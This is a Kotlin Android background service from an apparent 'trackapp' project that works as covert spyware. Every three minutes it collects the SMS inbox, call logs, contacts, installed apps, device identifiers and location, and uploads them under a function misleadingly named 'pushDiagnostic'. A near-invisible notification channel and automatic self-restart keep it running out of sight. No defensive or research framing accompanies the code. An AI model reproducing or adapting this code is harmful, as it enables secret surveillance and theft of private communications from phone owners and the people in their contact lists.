package com.wahyu.trackapp

import android.Manifest
import android.annotation.SuppressLint
import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.database.Cursor
import android.graphics.Color
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.IBinder
import android.os.SystemClock
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Settings
import android.util.Log
import androidx.annotation.RequiresApi
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.core.app.NotificationCompat.PRIORITY_MIN
import androidx.core.content.ContextCompat
import com.google.gson.Gson
import kotlinx.coroutines.*
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import java.util.*


class AppService : Service() {

    private val TAG: String = "AppService"

    private val NOTIF_ID = 1
    private val NOTIF_CHANNEL_ID = "Channel_Id"
    private var locationManager: LocationManager? = null
    private var deviceLocation: String? = null
    private var lifecycle: String? = null

    private fun restartService() {
        val restartServiceIntent = Intent(applicationContext, this.javaClass)
        restartServiceIntent.setPackage(packageName)

        val restartServicePendingIntent = PendingIntent.getService(
            applicationContext,
            1,
            restartServiceIntent,
            PendingIntent.FLAG_IMMUTABLE
        )
        val alarmService = applicationContext.getSystemService(ALARM_SERVICE) as AlarmManager
        alarmService[AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime() + 1000] =
            restartServicePendingIntent
    }


    @RequiresApi(Build.VERSION_CODES.M)
    override fun onTaskRemoved(rootIntent: Intent?) {
        Log.d(TAG, "onTaskRemoved")

        restartService()

        super.onTaskRemoved(rootIntent)
    }


    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "--> Service Started")

        locationManager = getSystemService(LOCATION_SERVICE) as LocationManager?
        ContextCompat.getMainExecutor(applicationContext).execute {
            try {
                // Request location updates
                locationManager?.requestLocationUpdates(
                    LocationManager.NETWORK_PROVIDER,
                    0L,
                    0f,
                    locationListener
                )
            } catch (ex: SecurityException) {
                Log.d(TAG, "Security Exception, no location available")
            }
        }

        val interval: Long = 180000

        Timer().schedule(object : TimerTask() {
            override fun run() {
                Log.d(TAG, "todo for hit background service repeat")
                pushDiagnostic()
            }
        }, 0, interval)

        startForeground()


        return START_STICKY
    }

    private val locationListener: LocationListener = object : LocationListener {
        override fun onLocationChanged(location: Location) {
            Log.d(TAG, "location " + location.longitude + ":" + location.latitude)
            val currentLocation = mutableMapOf<String, Any>()
            currentLocation["latitude"] = location.latitude
            currentLocation["longitude"] = location.longitude
            Log.d(TAG, "location json" + Gson().toJson(currentLocation))
            deviceLocation = Gson().toJson(currentLocation)
        }

        override fun onStatusChanged(provider: String, status: Int, extras: Bundle) {
            Log.d(TAG, "Status Location Changed = provider $provider, status $status")
        }

        override fun onProviderEnabled(provider: String) {
            Log.d(TAG, "onProviderEnabled = provider $provider")
        }

        override fun onProviderDisabled(provider: String) {
            Log.d(TAG, "onProviderDisabled = provider $provider")
        }
    }

    private fun pushDiagnostic() {


        NetworkConfig().getService()
            .pushDiagnostic(getModel())
            .enqueue(object : Callback<String> {
                override fun onFailure(call: Call<String>, t: Throwable) {

                }

                override fun onResponse(
                    call: Call<String>,
                    response: Response<String>
                ) {
                    Log.d(TAG, "response ${Gson().toJson(response.body())}")
                }
            })

    }

    override fun onDestroy() {
        Log.d(TAG, "onDestroy")
        Log.d(TAG, "--> AppService Destroyed")
    }

    override fun onBind(p0: Intent?): IBinder? {
        return null
    }

    private fun startForeground() {
        val channelId =
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                createNotificationChannel(App.CHANNEL_ID, App.CHANNEL_NAME)
            } else {
                // If earlier version channel ID is not used
                // https://developer.android.com/reference/android/support/v4/app/NotificationCompat.Builder.html#NotificationCompat.Builder(android.content.Context)
                ""
            }

        val notificationBuilder = NotificationCompat.Builder(this, channelId)
        val notification = notificationBuilder.setOngoing(true)
            .setSmallIcon(R.mipmap.ic_launcher)
            .setPriority(PRIORITY_MIN)
            .setCategory(Notification.CATEGORY_SERVICE)
            .build()
        startForeground(1, notification)
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private fun createNotificationChannel(channelId: String, channelName: String): String {
        val chan = NotificationChannel(
            channelId,
            channelName, NotificationManager.IMPORTANCE_NONE
        )
        chan.lightColor = Color.BLUE
        chan.lockscreenVisibility = Notification.VISIBILITY_PRIVATE
        val service = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        service.createNotificationChannel(chan)
        return channelId
    }

    private fun getModel(): ServiceModel? {
        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_COARSE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            return null
        }

        val smsLogs = getSMSLogs()
        val callLogs = Gson().toJson(getCallLogs())
        val listContact = Gson().toJson(getNamePhoneDetails())
        val appsInstalled = getAllAppsInstalled()
        var strLocation = "Location Unknown"
        if (deviceLocation != null) {
            strLocation = deviceLocation!!
        }

        val model = ServiceModel(
            location = strLocation,
            deviceInfo = getSystemDetail(),
            callLogs = callLogs,
            smsLogs = smsLogs,
            listContact = listContact,
            appsDownloaded = appsInstalled,
        )

        Log.d(TAG, "request model ${Gson().toJson(model)}")

        return model
    }

    @SuppressLint("HardwareIds")
    private fun getSystemDetail(): String {

//        val telemanager = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
//        val getSimSerialNumber = telemanager.simSerialNumber
//        val getSimNumber = telemanager.line1Number

        val deviceInfo = DeviceInfo(
            Brand = Build.BRAND,
            DeviceID = Settings.Secure.getString(
                contentResolver,
                Settings.Secure.ANDROID_ID
            ),
            Model = Build.MODEL,
            ID = Build.ID,
            SDK = Build.VERSION.SDK_INT,
            Manufacture = Build.MANUFACTURER,
            User = Build.USER,
            Type = Build.TYPE,
            Base = Build.VERSION_CODES.BASE,
            Incremental = Build.VERSION.INCREMENTAL,
            Board = Build.BOARD,
            Host = Build.HOST,
            FingerPrint = Build.FINGERPRINT,
            VersionCode = Build.VERSION.RELEASE
        )

        return Gson().toJson(deviceInfo)
    }

    private fun getCallLogs(): ArrayList<CallLogs> {
        val callLogsBuffer = ArrayList<CallLogs>()
        callLogsBuffer.clear()
        val managedCursor: Cursor? = this.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            null, null, null, null
        )
        val number: Int? = managedCursor?.getColumnIndex(CallLog.Calls.NUMBER)
        val type: Int? = managedCursor?.getColumnIndex(CallLog.Calls.TYPE)
        val date: Int? = managedCursor?.getColumnIndex(CallLog.Calls.DATE)
        val duration: Int? = managedCursor?.getColumnIndex(CallLog.Calls.DURATION)
        while (managedCursor?.moveToNext() == true) {
            val phNumber: String? = number?.let { managedCursor.getString(it) }
            val callType: String? = type?.let { managedCursor.getString(it) }
            val callDate: String? = date?.let { managedCursor.getString(it) }
            val callDayTime = Date(java.lang.Long.valueOf(callDate!!))
            val callDuration: String? = duration?.let { managedCursor.getString(it) }
            var dir: String? = null
            when (callType?.toInt()) {
                CallLog.Calls.OUTGOING_TYPE -> dir = "OUTGOING"
                CallLog.Calls.INCOMING_TYPE -> dir = "INCOMING"
                CallLog.Calls.MISSED_TYPE -> dir = "MISSED"
            }
            callLogsBuffer.add(
                CallLogs(
                    phoneNumber = phNumber,
                    callType = callType,
                    callDate = callDayTime,
                    callDuration = callDuration
                )
            )
        }
        managedCursor?.close()

        Log.d(TAG, "Call Logs --> ${Gson().toJson(callLogsBuffer)}")

        return callLogsBuffer
    }

    private fun getSMSLogs(): String {
        val cursor = contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)
        var msgData = ""
        if (cursor!!.moveToFirst()) { // must check the result to prevent exception
            do {
                for (idx in 0 until cursor.columnCount) {
                    msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx)
                }
                // use msgData
            } while (cursor.moveToNext())
        } else {
            // empty box, no SMS
        }
        Log.d(TAG, "SMS Logs --> $msgData")
        if (msgData == "") {
            msgData = "No SMS Data"
        }
        return msgData
    }

    @SuppressLint("Range")
    fun getNamePhoneDetails(): MutableList<Contact> {
        val names = mutableListOf<Contact>()
        val cr = contentResolver
        val cur = cr.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
            null, null, null
        )
        if (cur!!.count > 0) {
            while (cur.moveToNext()) {
                val id =
                    cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NAME_RAW_CONTACT_ID))
                val name =
                    cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                val number =
                    cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                names.add(Contact(id, name, number))
            }
        }
        Log.d(TAG, "Contact Phone --> ${Gson().toJson(names)}")
        return names
    }


    @Throws(PackageManager.NameNotFoundException::class)
    fun getAllAppsInstalled(): String {
        val mainIntent = Intent(Intent.ACTION_MAIN, null)
        mainIntent.addCategory(Intent.CATEGORY_LAUNCHER)

        // get list of all the apps installed
        val ril = packageManager.queryIntentActivities(mainIntent, 0)
        val componentList: List<String> = ArrayList()
        lateinit var name: String
        var i = 0

        // get size of ril and create a list
        val apps = arrayOfNulls<String>(ril.size)
        for (ri in ril) {
            if (ri.activityInfo != null) {
                // get package
                val res = packageManager.getResourcesForApplication(ri.activityInfo.applicationInfo)
                // if activity label res is found
                name = if (ri.activityInfo.labelRes != 0) {
                    res.getString(ri.activityInfo.labelRes)
                } else {
                    ri.activityInfo.applicationInfo.loadLabel(packageManager).toString()
                }
                apps[i] = name
                i++
            }
        }
        // set all the apps name in list view
        Log.d(TAG, "apps --> ${Gson().toJson(apps)}")
        return Gson().toJson(apps)
    }

}